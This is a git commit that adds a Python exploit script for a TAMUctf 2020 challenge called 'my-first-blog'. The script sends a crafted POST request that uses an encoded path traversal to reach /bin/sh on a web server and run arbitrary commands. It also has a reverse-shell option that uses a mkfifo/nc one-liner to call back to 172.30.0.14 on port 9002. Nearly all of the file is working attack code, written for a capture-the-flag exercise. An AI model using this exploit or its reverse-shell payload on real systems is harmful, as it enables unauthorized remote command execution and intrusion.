15501ca71a82e5c42d06ed53ba5a39aeed027eef
E. Le Dœuff <contact@weldev.tech>
2020-03-26 16:42:37 +0100

    Create my-first-blog_expl0it.py

---
+++ tamuctf2020/my-first-blog_expl0it.py
@@ -0,0 +1,36 @@
+import sys
+import socket
+
+def connect(soc):
+    response = ""
+    try:
+        while True:
+            connection = soc.recv(1024)
+            if len(connection) == 0:
+                break
+            response += connection
+    except:
+        pass
+    return response
+
+def cve(target, port, cmd):
+    soc = socket.socket()
+    soc.connect((target, int(port)))
+    payload = 'POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0\r\nContent-Length: 1\r\n\r\necho\necho\n{} 2>&1'.format(cmd)
+    soc.send(payload)
+    receive = connect(soc)
+    print(receive)
+
+if __name__ == "__main__":
+
+
+    try:
+        if(sys.argv[1] == "--reverse-shell" or sys.argv[1] == '-R'):
+            cmd = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 172.30.0.14 9002>/tmp/f"
+        else:
+            cmd = sys.argv[1]
+        print("=== RESULT - %s ===\n" % cmd) 
+        cve("172.30.0.2", 80, cmd)
+   
+    except IndexError:
+        print("python my-first-blog_expl0it.py [-R][--reverse-shell][bash command]")
